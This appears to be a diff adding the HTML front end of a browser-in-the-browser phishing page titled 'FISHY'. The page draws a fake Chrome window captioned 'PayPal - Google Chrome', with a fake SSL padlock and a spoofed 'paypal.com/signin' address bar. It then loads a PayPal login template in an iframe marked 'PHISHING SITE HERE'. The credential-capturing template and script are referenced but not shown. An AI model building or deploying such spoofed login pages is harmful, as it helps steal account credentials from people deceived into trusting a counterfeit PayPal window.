@@ -1,0 +1,58 @@
+<html>
+
+<head>
+    <title>FISHY</title>
+
+    <link href="inc/css/style.css" rel="stylesheet" type="text/css" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.10.3/jquery-ui.min.js"></script>
+
+</head>
+
+<body id="body">
+    <img style="padding: 5em; position: absolute; height: 12em; width: 12em" src="inc/img/checkout.png" onclick="imise('close')">
+    <div id="fakebrowser">
+        <div id="titlebar">
+            <img id="favicon" src="inc/img/chrome.png"><span id="title">PayPal - Google Chrome</span>
+            <!-- Close -->
+            <svg title="Close" id="close" onclick="imise('close')" style="float: right;" width="45px" height="29px" viewBox="0 0 47 32" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                <g transform="translate(-977.000000, 0.000000)">
+                    <g transform="translate(977.000000, 0.000000)">
+                        <polygon points="0 32 46.998 32 46.998 0 0 0"></polygon>
+                        <path d="M23.2765,15.6459656 L18.005,10.3744656 L17.298,11.0824656 L22.569,16.3534656 L17.298,21.6244656 L18.005,22.3324656 L23.2765,17.0609656 L28.548,22.3324656 L29.255,21.6244656 L23.984,16.3534656 L29.255,11.0824656 L28.548,10.3744656 L23.2765,15.6459656 Z" fill="#000000" style="fill: rgb(0, 0, 0) !important;"></path>
+                    </g>
+                </g>
+            </svg>
+            <!-- Maximise -->
+            <svg style="float: right;" width="45px" height="29px" viewBox="0 0 47 32" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                <g transform="translate(-930.000000, 0.000000)">
+                    <g transform="translate(930.000000, 0.000000)">
+                        <polygon points="0 32 47 32 47 0 0 0"></polygon>
+                        <rect stroke="#000000" x="17.5" y="11.5" width="11" height="11"></rect>
+                    </g>
+                </g>
+            </svg>
+            <!-- Minimise -->
+            <svg style="float: right;" width="45px" height="29px" viewBox="0 0 47 32" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                <g transform="translate(-883.000000, 0.000000)">
+                    <g transform="translate(883.000000, 0.000000)">
+                        <polygon points="0 32 47 32 47 0 0 0"></polygon>
+                        <polygon fill="#000000" points="17 22 29 22 29 23 17 23"></polygon>
+                    </g>
+                </g> 
+            </svg>
+            <!-- Browser window: URL Bar & Text -->
+            <div id="urlbar">
+                <img title="View site information" id="SSL" src="inc/img/SSL.png">
+                <span id="urltext" onclick="$(this).focus(); $(this).select();" spellcheck="false">
+                    <font color="#292A2B">paypal.com</font><font color="#96999C">/signin</font>
+                </span>
+            </div>
+        </div>
+        <!-- PHISHING SITE HERE -->
+        <iframe src="inc/templates/paypal/index.html"></iframe>
+        <script src="inc/js/iframe.js"></script>
+    </div>
+</body>
+
+</html>
